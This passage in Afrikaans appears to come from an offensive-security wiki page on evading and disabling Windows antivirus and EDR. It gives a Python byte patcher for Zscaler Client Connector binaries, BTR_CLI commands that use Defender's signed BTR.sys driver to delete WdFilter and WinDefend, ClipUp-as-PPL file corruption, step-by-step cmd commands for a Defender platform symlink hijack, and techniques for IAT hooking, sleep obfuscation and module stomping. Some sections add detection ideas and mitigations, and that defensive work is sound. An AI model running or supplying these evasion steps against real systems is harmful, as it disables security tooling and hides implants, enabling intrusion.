Zscaler se **Client Connector** pas toestelhoudingsreëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Houdingsevaluering vind **heeltemal aan die kliëntkant** plaas (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte valideer net dat die verbindende uitvoerbare lêer **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binêre lêers op die skyf te patch**, kan albei meganismes geneutraliseer word:

| Binêre lêer | Oorspronklike logika wat gepatch is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, dus is elke kontrole voldoenend |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs ongetekende) proses kan aan die RPC-pipes koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel van ’n minimale patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** posture-kontroles vertoon **groen/nakomend**.
* Ongetekende of gewysigde binaries kan die named-pipe RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie wys hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar byte-patches omseil kan word.

## Microsoft Defender `BTR.sys` misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige Microsoft-ondertekende remediëringskomponent sonder ’n geheuekorrupsie-bug en sonder ’n IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private remediëringstransaksie vervals en die beoogde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **post-kompromittering AV/EDR-neutraliseringsprimitief, nie aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-hulpbron `BOOTTIMETOOL` onttrek word, eerder as om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender skryf die hulpbron normaalweg as ’n ewekansige `[a-z]{8}.sys`-lêer neer en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer en gee `0xC0000056` (`STATUS_DELETE_PENDING`) terug ná suksesvolle uitvoering, sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die geanaliseerde builds hergebruik ’n vaste sleutel van 256 grepe, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kopstuk van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kopstuk-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n nulbeëindigde UTF-16-terugvoerpad en enige aantal items. Elke item het ’n kopstuk van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat eindig met **presies vier NUL-grepe**. Elke kopstuk-/datagebied word afsonderlik nagegaan met CRC-32-polinoom `0xEDB88320`, begintoestand `0xFFFFFFFF` en **geen finale XOR nie** (`~CRC32`); die CRC-toestand word vir elke gebied teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe bloot.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Vee ’n lêer uit, insluitend ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Flags][key path]` | Vee ’n registersleutel rekursief uit |
| 5 | `[Flags][key path + "\\" + value]` | Vee ’n registerwaarde uit |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/dateer ’n registerwaarde op en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die sleutel/waarde-skeidingsteken op die wire **twee opeenvolgende backslashes**; ’n konvensioneel geformateerde pad sal nie korrek gesplit word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier datagrepe van elke item word die ooreenstemmende `NTSTATUS`. Vir aksies 1 en 2, wat geen voorste vlagveld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeë-selflaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: onttrek `BTR.sys` uit die plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/valideer kontrolesomme/enkripteer gekoppelde aksies, skep die diensregistersleutel direk en roep dan `NtLoadDriver` aan vir `-trigger now`, of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registervoorbereiding vermy die normale SCM `CreateServiceW`-pad en genereer dus nie diensinstallasiegebeurtenis-ID 7045 nie. Artefakte wat deur selflaai geaktiveer word, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die stoorgroep en `SystemRoot`-skakel gereed is. `Start=1` saam met die hoëprioriteit-`Boot Bus Extender`-groep word eerder in Phase 1 uitgevoer: NTFS is bruikbaar, maar baie sekuriteitsdrywers met stelselbegin en EDR-dienste in gebruikersmodus is nog nie geïnisialiseer nie. Boot-start-filters soos `WdFilter` is dalk reeds gelaai, maar BTR kan hul binaries of dienskonfigurasie verwyder voordat die volgende begin, en kan diensuitvoerbare lêers skrap voordat SCM hulle begin. ELAM sluit nie hierdie gaping nie, want BTR loop ná die boot-start-evaluering en het ’n geldige Microsoft-handtekening.<sup>[[36]](#references)</sup>

Verskeie aksies word in een transaksie uitgevoer. Die PoC voeg Aksie 1 vooraan vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie skrapversoek en verwyder dit voordat dit ontlaai. Dit verminder bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` dit moontlik maak om die drywer en albei strome saam te verwyder.<sup>[[36]](#references)[[37]](#references)</sup>

### Hoëseintjie-opsporingskorrelasies

Reëls wat net op handtekeninge staatmaak en die Microsoft-lys van geblokkeerde kwesbare drywers spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, en onderskei terselfdertyd legitieme Defender-afstamming van ’n arbitrêre lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die skep van `.sys:changelist` is universeel vir BTR-staging. ’n `.dat` ADS wat aan dieselfde `.sys` gekoppel is, is besonder verdag omdat legitieme Defender terugvoer gewoonlik onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** Korrelleer die direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` met `Args=...:changelist` en `Group=Boot Bus Extender`, sonder ’n ooreenstemmende SCM-installasiegebeurtenis.
- **Sysmon 6 -> 23:** Korrelleer die laai van ’n bekende BTR-drywer uit nie-Defender-afstamming met daaropvolgende lêerskrapping wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinaries.
- **Sysmon 11 -> 23:** Maak ’n waarskuwing oor die vinnige skepping en skrapping van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; ’n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer ’n sekuriteitsnutsding se drywer deur `cmd.exe`, PowerShell of ’n onbekende proses gestage word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing ’n ondertekenaar-/vlakhiërargie af sodat slegs ewe veel of hoër beskermde prosesse met mekaar kan peuter. Aanvallend gesien, as jy ’n PPL-geaktiveerde binary wettig kan begin en sy argumente kan beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in ’n beperkte, PPL-gesteunde skryfprimitief teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL’s) moet met ’n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare beskermingsvlak moet aangevra word wat ooreenstem met die binary se ondertekenaar (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-nutsgoed
- Oopbron-helper: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente aan die teiken-EXE deur):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruikspatroon:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Die ondertekende stelselbinêre lêer `C:\Windows\System32\ClipUp.exe` begin self ’n proses en aanvaar ’n parameter om ’n loglêer na ’n pad wat deur die oproeper gespesifiseer word, te skryf.
- Wanneer dit as ’n PPL-proses begin word, vind die lêerskryfaksie met PPL-ondersteuning plaas.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te verwys.

8.3-kortpadhelpers
- Lys kort name: `dir /x` in elke ouergids.
- Lei ’n kort pad in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstrak)
1) Begin die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n lanseerder te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp-logpadargument deur om ’n lêer in ’n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die AV die teikenbinêre lêer normaalweg oop of gesluit hou terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryfaksie tydens selflaai, voordat die AV begin, deur ’n outomatiese begindiens te installeer wat betroubaar vroeër loop. Bevestig die selflaaivolgorde met Process Monitor (selflaailogging).
4) Met herbegin vind die PPL-ondersteunde skryfaksie plaas voordat die AV sy binêre lêers sluit, wat die teikenlêer beskadig en voorkom dat dit begin.

Voorbeeldaanroep (paaie ter wille van veiligheid geredigeer/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Aantekeninge en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, net waar dit geskryf word; dié primitief is geskik vir korrupsie eerder as presiese inhoudsinspuiting.
- Plaaslike admin/SYSTEM is nodig om ’n diens te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is krities: die teiken moenie oop wees nie; uitvoering tydens selflaai vermy lêersluitings.

Opsporing
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral met nie-standaard lanseerders as ouerprosesse, rondom selflaai.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek dienskepping/-wysiging voordat Defender se opstartfoute voorkom.
- Lêerintegriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en afwykende PPL-vlakgebruik deur nie-AV-binaries.

Versagtings
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Diensbestuur: beperk die skep/wysiging van dienste wat outomaties begin en monitor manipulasie van die beginvolgorde.
- Maak seker dat Defender se tamper protection en vroeëselflaaibeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3-kortnaamgenerering te deaktiveer op volumes waarop sekuriteitsnutsmiddels gehuisves word, indien dit met jou omgewing versoenbaar is (toets deeglik).

## Peutering met Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende te lys:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse daarvandaan (en dateer die diens-/registerpaaie dienooreenkomstig op). Hierdie keuse vertrou gidsinskrywings, insluitend gids-reparse points (symlinks). ’n Administrateur kan dit benut om Defender na ’n pad te herlei waarop ’n aanvaller kan skryf, en DLL-sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herlaai of Defender se platformkeuse te aktiveer (diensherbegin tydens selflaai)
- Slegs ingeboude nutsmiddels word vereis (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformkeuse vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te verifieer dat die teiken na ’n beskermde/vertroude pad verwys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n directory-symlink met ’n hoër weergawe binne Platform wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien, en die dienskonfigurasie/register behoort daardie ligging te weerspieël.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas/vervang DLL’s wat Defender vanaf sy toepassinggids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensstop/diensweiering: Verwyder die version-symlink sodat die gekonfigureerde pad met die volgende begin nie opgelos word nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sy eie privilege escalation bied nie; dit vereis adminregte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2-implant skuif en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur aanvaller-beheerde, position-independent code (PIC) te stuur. Dit veralgemeen evasion verder as die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Hoëvlakbenadering
- Stoor ’n PIC-blob langs die teikenmodule met behulp van ’n reflective loader (voorafgeplaas of as metgesel). Die PIC moet selfstandig en position-independent wees.
- Wanneer die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasions uit voordat dit die werklike API-adres met ’n tail call aanroep. Tipiese evasions sluit in:
  - Memory masking/unmasking rondom die aanroep (bv. enkripteer beacon-areas, RWX→RX, verander bladsynamme/-toestemmings) en herstel dit ná die aanroep.
  - Call-stack spoofing: bou ’n onskadelike stack en skakel oor na die teiken-API sodat call-stack-analise die verwagte frames oplewer.<sup>[[9]](#references)</sup>
- Voer vir verenigbaarheid ’n koppelvlak uit sodat ’n Aggressor-script (of ekwivalent) kan registreer watter APIs vir Beacon, BOFs en post-ex DLLs gehook moet word.

Waarom IAT hooking hier
- Werk vir enige kode wat die gehookte import gebruik, sonder om die tool se kode te wysig of op Beacon staat te maak om spesifieke APIs te proxy.
- Dek post-ex DLLs: deur LoadLibrary* te hook, kan jy modulelaaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep teen call-stack-gebaseerde detections deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens die gelaaide module se DllMain.
- Hou wrappers klein en PIC-safe; resolve die ware API via die oorspronklike IAT-waarde wat jy voor die patching vasgelê het, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy bladsye wat tegelyk skryfbaar en uitvoerbaar is.

Call-stack spoofing-stub
- Draugr-styl PIC-stubs bou ’n vals call chain (return addresses in benign modules) en spring dan na die werklike API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te land voordat die API-proloog uitgevoer word.

Operasionele integrasie
- Voeg die reflective loader vooraan post-ex-DLLs by sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig by dieselfde evasion path baat vind, sonder kodeveranderinge.

Oorwegings vir detection/DFIR
- IAT-integriteit: entries wat na nie-image-adresse (heap/anon) resolve; periodieke verifikasie van import pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image-PIC; inkonsekwente RtlUserThreadStart-afstamming.
- Loader-telemetrie: in-process-skrywes na die IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-regions wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte laaie van automation/clr-assemblies wat met memory masking-events korreleer.

Verwante boustene en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack spoofing-stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT-hooks via ’n resident PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer met ’n custom resolver te vervang wat hooks eerste nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **resident PICO** (persistent PIC object) wat voortbestaan nadat die transient loader PIC homself vrygestel het.
- Export ’n `setup_hooks()`-funksie wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal imports in `_GetProcAddress` oor en gebruik ’n hash-based hook lookup soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; andersins, delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens link time met Crystal Palace `addhook "MODULE$Func" "hook"`-entries. Die hook bly geldig omdat dit binne die resident PICO woon.

Dit lewer **import-time IAT-redirection** sonder om die gelaaide DLL se code section ná laai te patch.

### Hookable imports afdwing wanneer die teiken PEB-walking gebruik

Import-time-hooks word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash resolve (sonder ’n import entry), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan opspoor:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, omvou die oproep in ’n Ekko-styl obfuscation chain wat die in-memory image tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met vervaardigde `CONTEXT`-frames oproep.
- Tipiese chain (x64): stel image op `PAGE_READWRITE` → enkripteer met RC4 via `advapi32!SystemFunction032` oor die volledige mapped image → voer die blocking wait uit → dekripteer met RC4 → **herstel permissions per section** deur PE-sections te deurloop → sein voltooiing.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-template; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele detail: gee “success” terug vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon versteek die module vir scanners tydens idle windows en vermy die klassieke “patched `Sleep()`”-signature.

Detection-idees (telemetrie-gebaseer)
- Uitbarstings van `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers ter grootte van ’n image gebruik word.
- Groot `VirtualProtect`-reekse, gevolg deur custom herstel van permissions per section.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-enabled teikens sal die eerste indirect jump na ’n mid-function gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl chains in geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirect destination wat deur die chain gebruik word met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-entries.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volledige image size** dek.
- Gebruik eerder die **allocation base** en allocation size vir manually mapped/PIC/stomped regions.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige uitvoerbare sections onder aanvallerbeheer wat indirect targets sal word.

Dit verander ROP/JOP-styl sleep chains van “werk net in non-CFG-prosesse” in ’n herbruikbare primitive vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` saamgestel is.

### CET-safe stack spoofing vir sleeping threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek, omdat ’n spoofed `Rip` steeds met die hardware shadow stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Maak ’n backup van die huidige thread se werklike TEB/TIB.
- Vang die werklike sleeping context met `GetThreadContext` vas.
- Kopieer **net** die werklike `Rip` na die spoof-context, en laat die spoofed `Rsp`/stack state onaangeraak.
- Kopieer tydens die sleep window die spoof-thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n geldige stack range unwind.
- Herstel ná afloop van die wait die oorspronklike TIB en thread context.

Dit behou ’n CET-konsekwente instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stackmetadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te signatured is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanuit ’n suspended helper thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en verwerk hulle met `NtAlertResumeThread`.
- Stoor die chain state op die heap eerder as op die helper stack om te voorkom dat die verstekthreadstack van 64 KB uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies te sein en te blokkeer.
- Suspend die main thread voordat die TIB/context herstel word (`NtSuspendThread` → herstel → `NtResumeThread`) om die race window waarin ’n scanner ’n half-herstelde stack kan vasvang, te verklein.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signature met ’n helper-thread/APC-signature, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behoue bly.

Bykomende detection-idees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` wat om `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gewikkel is.
- `NtQueryInformationThread` gevolg deur direkte skrywes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-chains wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van section-permissions bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch pivots binne signed modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text`-section van ’n DLL wat reeds binne die teikenproses gemap is** uit, in plaas daarvan om ooglopende private executable memory te allokeer of ’n nuwe sacrificial DLL te laai. Die overwrite-teiken moet ’n **gelaaide, disk-backed image** wees waarvan die code space die payload kan akkommodeer sonder om code paths te beskadig wat die proses nog nodig het.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die remote process gelaai nie, en ’n te klein code region sal die proses laat crash. ’n Betroubaarder workflow is:

1. Lys die teikenproses se modules en hou ’n **names-only include list** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese byte size** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-section se **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte, omdat dit die grootte van die uitvoerbare section **wanneer dit in memory gemap is** weerspieël.
4. Parse die **Export Address Table (EAT)** en kies ’n exported function RVA as die stomp se begin-offset.
5. Bereken die **blast radius**: as die payload die gekose funksie se grens oorskry, sal dit aangrensende exports wat daarna in memory gerangskik is, oorskryf.

Tipiese recon-/keusehelpers wat in die natuur voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die remote process om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die teikentoepassing uitgevoer word; anders kan normale kodepaaie die stomped bytes tref voor of ná thread creation.
